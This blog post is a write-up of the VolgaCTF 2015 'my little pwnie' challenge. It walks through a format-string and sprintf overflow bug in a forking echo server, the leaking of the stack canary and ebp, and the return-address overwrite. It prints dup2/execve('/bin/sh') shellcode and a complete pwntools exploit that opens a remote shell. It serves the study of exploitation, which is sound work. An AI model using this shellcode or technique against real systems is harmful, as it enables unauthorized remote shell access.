---
title: VolgaCTF 2015 Quals -- my little pwnie
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- VolgaCTF
- CTF
- Python
- Pwnable
- assembly
- format_string
- BOF
categories:
- write-ups
date: '2015-05-22 14:08:00 +0000'
---

**Category:** Pwn
**Points:** 250
> Just another pwn task. Break in!
> nc pwnie.2015.volgactf.ru 7777
> [my_little_pwnie](http://files.2015.volgactf.ru/my_little_pwnie/my_little_pwnie)

I solve the challenge after the end of the CTF, because I think this is a great challenge for practicing **format string** and **sprintf BOF vulnerability**. Special thanks to [Lays](http://blog.l4ys.tw) for putting the exploit on the trello and let me have time to study the challenge. 

<!-- more -->

We got a 32 bit ELF, with stack guard enabled, but no NX.  
It's a simple echo server. Whenever someone connect to it, it fork a process to handle the request. First it ask us to input some string, and then it echo the string back to us.  

Launch it with IDA Pro and take a look at it:  

```c
int __cdecl start_echo(int fd)
{

    int result; // eax@4
    int v2; // esi@4
    int i; // [sp+18h] [bp-A0h]@1
    int v4; // [sp+1Ch] [bp-9Ch]@1
    int v5; // [sp+20h] [bp-98h]@1
    char v6; // [sp+24h] [bp-94h]@1
    int v7; // [sp+9Ch] [bp-1Ch]@1

    v7 = *MK_FP(__GS__, 20);
    send_to_user(fd, "This is a simple echo server. Type exit to quit.\n");
    v4 = "ohcE";
    v5 = " :";
    memset(&v6, 0, 120u);

    for ( i = 1; i; i = echoing((char *)&v4, fd) )
    ;
    result = 0;
    v2 = *MK_FP(__GS__, 20) ^ v7;
    return result;
}
```

So, the `start_echo()` will call `echoing(v4, fd)` , which v4 is a pointer to char  
Let's take a look at the `echoing()` function:

```c
int __cdecl echoing(char *a1, int fd)
{
    int result; // eax@2
    int v3; // ecx@10
    int v4; // [sp+20h] [bp-58h]@3
    char *i; // [sp+24h] [bp-54h]@3
    char user_input[64]; // [sp+2Ch] [bp-4Ch]@1
    int v7; // [sp+6Ch] [bp-Ch]@1

    v7 = *MK_FP(__GS__, 20);
    send_to_user(fd, "Type string to echo back: ");
    memset(user_input, 0, 64u);
    if ( recv(fd, user_input, 63u, 0) )
    {
        v4 = strcmp(user_input, "exit\n");
        for ( i = user_input; &user_input[strlen(user_input)] > i; ++i )
        {
            if ( *i == 'n' )
            {
                *(_DWORD *)a1 = "ts I";
                *((_DWORD *)a1 + 1) = " pir";
                *((_DWORD *)a1 + 2) = "siht";
                *((_DWORD *)a1 + 3) = "fwa ";
                *((_DWORD *)a1 + 4) = "s lu";
                *((_DWORD *)a1 + 5) = "obmy";
                *((_WORD *)a1 + 12) = "\nl";
                a1[26] = 0;
                v4 = 0;
                goto LABEL_9;
            }
        }
        sprintf(a1 + 6, user_input);
LABEL_9:
        send_to_user(fd, a1);
        result = v4;
    }
    else
    {
        fwrite("Failed to read socket\n", 1u, 0x16u, stderr);
        result = -1;
    }
    v3 = *MK_FP(__GS__, 20) ^ v7;
    return result;
}
```
So we found that there's a **format string** vulnerability at the line  
`sprintf(a1 + 6, user_input);`  
But notice that the program will filter out the character 'n', which means we can't use **%n** to write the memory. 

Fortunately, the vulnerability's happened in `sprintf`, not `printf`. 
`sprintf(a1 + 6, user_input)` means the `user_input` will be **output** to buffer `a1` (the one that `start_echo` pass into `echoing`). 

This behavior can be view as the program **copy** `user_input`'s content to `a1`. If we input string `"%45c"`, the program will output 45 characters to `a1`, which is, **copy** 45 characters to `a1`.  

So if we construct the payload string carefully, we can overwrite the return address in `start_echo()`. First we'll have to leak the stack canary. After checking the memory by using gdb, we can found that the canary is at `%26$p`. We also need to leak `start_echo()`'s `ebp` too, since we need to calculate the address of `a1` ( which is on the stack in function `start_echo()` ). We found that `ebp` is at `%29$p`.

So by leaking canary & `start_echo()`'s ebp , we can construct our payload now. But there're some details we need to be aware of:
1. **`sprintf` will stop at null byte**. That is, when `sprintf` encounter a null byte, it will write the null byte to the buffer and stop. 
2. So, **since the first byte of the canary is always null byte**, we'll have to modify the canary first, so `sprintf` will continue writing bytes to buffer and let us overwrite the return address.
3. After we overwrite the return address, we'll have to change the canary back to its correct value, by sending another payload string to `sprintf`. 
4. Don't forget to write the `fd` too, or else it will be overwritten to null byte (thanks to `sprintf` apparently )

Here's the payload string:
```python
canary |= 0x41 # remove the null byte first
payload = "%122c" # padding to canary
payload += p32(canary)
payload += "A"*28 # padding to return address
payload += p32(buf) # return address set to buffer's address (=shellcode)
payload += p32(4) # fd
# send the first payload
send(payload)

payload = "%122c" # add the null byte back into the canary
# send the second payload
send(payload)
```

So now we overwrite the return address of function `start_echo()` and let it jump to the buffer `a1`, which we can put our shellcode on it. But again, there're some limitations:
 1. It's a **fork server**, so we can't simply just execute `execve("/bin/sh")`. The problem cause by file descriptor will make us fail to execute our own command after we get the shell.
 2. So, we'll have to construct a shellcode, which execute `dup2(4, 0)`, `dup2(4, 1)` and `dup2(4, 2)` before executing `execve("/bin/sh")`.
 3. Don't forget the program will filter out the character 'n', so we'll have to do something with it.
    
For problem 3, my solution was construct a shellcode without having character 'n'. Or, you can just overwrite the return address to `user_input`, since the program doesn't modify the input, the original input string will still remain on the buffer.

Anyway, I choose to construct a shellcode without having character 'n'. Typically, during the shellcode construction for executing `execve("/bin/sh")`, we'll have the following assembly:

```
push 0x68732f2f     ; hs//
push 0x6e69622f     ; nib/
```

Which has 'n' in it. However, we can simply use `xor` to eliminate the character 'n'. Since `0x6e69622f = 0x91969dd0 ^ 0xffffffff`, we can modify the assembly into:
```
xor ecx, ecx
dec ecx ; ecx = 0xffffffff
xor ecx, 0x91969dd0 ; ecx = 0x6e69622f
push ecx
```

So here's the entire assembly:
```
BITS 32

global _start

_start:                     ; this is where code starts getting exec'ed
	xor ebx, ebx
	xor eax, eax
	xor ecx, ecx
	xor edx, edx
	mov bl, 0x4

d:
	mov al, 0x3f ; dup2 syscall number
	int 0x80 ; dup2( ebx(=4), ecx(=0, 1, 2) )
	inc ecx
	cmp ecx, 0x3
	jne d
	
	; execve(/bin/sh)
	xor eax, eax
	mov al, 0xb
	xor ecx, ecx
	push ecx
	push 0x68732f2f
	dec ecx ; ecx = 0xffffffff
	xor ecx, 0x91969dd0 ; 0xfffffff ^ 0x91969dd0 = 0x6e69622f
	push ecx
	mov ebx, esp
	xor ecx, ecx
	int 0x80

```

Finally, we have the exploit:
```python
from pwn import *
import time

#HOST="localhost"
HOST="pwnie.2015.volgactf.ru"
PORT="7777"

# dup2(4, 0) + dup2(4, 1) + dup2(4, 2) + execve('/bin/sh'), 46 byte
shellcode =  [0x31, 0xdb, 0x31, 0xc0, 0x31, 0xc9, 0x31, 0xd2, 0xb3, 0x04, 0xb0, 0x3f, 0xcd, 0x80, 0x41, 0x83, 0xf9, 0x03, 0x75, 0xf6, 0x31, 0xc0, 0xb0, 0x0b, 0x31, 0xc9, 0x51, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x49, 0x81, 0xf1, 0xd0, 0x9d, 0x96, 0x91, 0x51, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80]

# insert 0x90 in the left, make it length = 63
shellcode = ''.join(chr(c) for c in shellcode).rjust(63, "\x90")

r = remote(HOST, PORT)

r.recvuntil("echo back:")
log.info("leaking canary & ebp...")
r.send(".%26$p.%29$p")
resp = r.recv(1024)
resp = r.recv(1024)

canary = int(resp.split(".")[1], 16)
ebp = int(resp.split(".")[2], 16)
buf = ebp - 0x9c + 6 + 8

log.success("canary: " + hex(canary))
log.success("ebp: " + hex(ebp))
log.success("buf: " + hex(buf))

r.recvuntil("echo back: ")

canary |= 0x41 # remove the null byte first
payload = "%122c" # padding to canary
payload += p32(canary)
payload += "A"*28 # padding to return address
payload += p32(buf) # return address set to buffer's address (=shellcode)
payload += p32(4) # fd

log.info("sending payload...")
r.send(payload)

r.recvuntil("echo back: ")
payload = "%122c" # add the null byte back into the canary
log.info("correcting canary...")
r.send(payload)

r.recvuntil("echo back: ")
log.info("sending shellcode...")
r.send(shellcode)

r.recvuntil("echo back: ")
r.send("exit\n")

r.interactive()

```

Great challenge, learn a lot from it!